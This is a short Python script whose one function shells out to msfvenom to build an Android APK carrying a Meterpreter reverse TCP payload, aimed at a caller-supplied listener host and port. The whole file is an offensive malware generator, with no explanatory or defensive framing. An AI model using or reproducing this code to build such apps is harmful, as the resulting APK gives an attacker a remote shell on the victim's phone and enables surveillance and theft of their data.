import os
def gen(apkname,lhost,lport):
    os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R> {apkname}.apk')
